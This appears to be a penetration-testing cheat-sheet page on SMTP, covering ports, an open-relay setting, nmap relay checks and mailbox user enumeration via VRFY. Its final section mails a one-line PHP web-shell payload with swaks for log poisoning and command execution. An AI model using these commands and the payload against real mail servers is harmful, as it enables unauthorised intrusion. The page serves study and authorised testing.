+++
title = "🌐 SMTP/ESMTP: TCP 25/465/587"
+++

- `TCP 25`: unencrypted
- `TCP 465/587/2525`: encrypted
- Security:
    - DKIM: https://dkim.org/
    - Sender Policy Framework (SPF): https://dmarcian.com/what-is-spf/
    - DMARC: https://dmarc.org/
- https://serversmtp.com/smtp-error/
- 
{{% details "Dangerous Settings" %}}

| **Option**               | **Description**                                                                                                                                                                          |
| ------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `mynetworks = 0.0.0.0/0` | With this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it. |
{{% /details %}}

- https://hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html#basic-actions

```bash
# CAREFUL! Open relay check
sudo nmap -p25,465,587,2525 --script smtp-open-relay <TARGET>
```

## User Enumeration

- https://github.com/cytopia/smtp-user-enum#how-does-vrfy-work

```bash
wget https://raw.githubusercontent.com/cytopia/smtp-user-enum/refs/heads/master/smtp-user-enum

python3 ./smtp-user-enum --mode VRFY --file /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt --domain <DOMAIN> <TARGET> 25

# Will likely find common services/machine users
python3 ./smtp-user-enum --mode VRFY --file /usr/share/seclists/Usernames/cirt-default-usernames.txt --domain <DOMAIN> <TARGET> 25
```

### Manually

```bash
# Manual enumeration
telnet <TARGET> 25
EHLO <HOSTNAME>
VRFY <USER>  # 250 success; 252 maybe/not; 550 failure
EXPN
```

## Send Email

- `/var/mail/<USER>`
- `/var/spool/mail/<USER>`

**Tip:** keep the PHP payload simple and on one line -- multiline can break in mail formatting. Avoid `!` and special chars that SMTP may encode.

```bash
# Body: for log poisoning or running scripts
swaks --server <TARGET> --to <USER> --from test --header "Subject: test" --body '<?php system($_GET["cmd"]); ?>'
```
